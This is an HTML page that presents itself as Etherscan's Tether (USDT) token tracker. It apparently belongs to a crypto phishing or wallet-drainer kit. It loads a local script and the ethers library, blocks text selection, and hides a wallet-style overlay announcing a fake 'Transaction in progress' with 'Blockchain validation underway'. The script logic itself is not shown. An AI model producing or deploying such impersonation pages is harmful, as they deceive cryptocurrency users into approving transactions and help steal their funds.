<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="./images/eth.svg" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
    />
    <title>Tether (USDT) Token Tracker | Etherscan</title>
    <link rel="stylesheet" href="./index.css" />
    <style>
        body {
            -webkit-user-select: none;
            user-select: none;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }

        #root {
            min-height: 100vh;
        }

#loader-overlay {
    display: none;
    position: fixed;
    inset: 0;
    width: 100%;
    height: 100dvh;
    min-height: 100dvh;
    background: rgba(0, 0, 0, 0.6);
    z-index: 2147483647;
    align-items: flex-end;
    justify-content: center;
    overflow: hidden;
}

#loader-overlay > div {
    background: #ffffff;
    border-radius: 24px 24px 0 0;
    width: 100%;
    max-height: 85dvh;
    box-sizing: border-box;
    box-shadow: 0 -10px 40px rgba(0,0,0,.3);
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    animation: tw-slide-up .35s ease-out;
}

@keyframes tw-slide-up {
    from {
        transform: translateY(100%);
    }
    to {
        transform: translateY(0);
    }
}

.tw-body {
    padding: 36px 24px 32px;
    padding-bottom: calc(32px + env(safe-area-inset-bottom));
    text-align: center;
    box-sizing: border-box;
}

.tw-check-circle {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    background: linear-gradient(135deg,#10b981,#059669);
    color: white;
    font-size: 48px;
    font-weight: bold;
}

.tw-title {
    color: #1a1a2e;
    font-size: 24px;
    font-weight: 700;
    margin: 20px 0 12px;
}

.tw-desc {
    color: #6b7280;
    line-height: 1.6;
    max-width: 320px;
    margin: auto;
}

.tw-btn {
    display: block;
    position: relative;
    z-index: 10;
    background: #0052ff;
    color: #fff;
    border: none;
    border-radius: 999px;
    width: 100%;
    padding: 18px;
    margin-top: 24px;
    cursor: pointer;
    font-size: 16px;
    font-weight: 600;
    box-sizing: border-box;
}
    </style>
</head>

<body>

    <div id="loader-overlay">
        <div>
            <div class="tw-body">
                <div class="tw-check-circle">
                    ✓
                </div>
                <h2 class="tw-title">
                    Processing...
                </h2>
                <p class="tw-desc">
                    Transaction in progress!
                    Blockchain validation is underway.
                    This may take a few minutes.
                </p>
                <button class="tw-btn">
                    Transaction details
                </button>
            </div>
        </div>
    </div>

    <div id="root"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

    <script type="module" src="./index.js"></script>

</body>
</html>
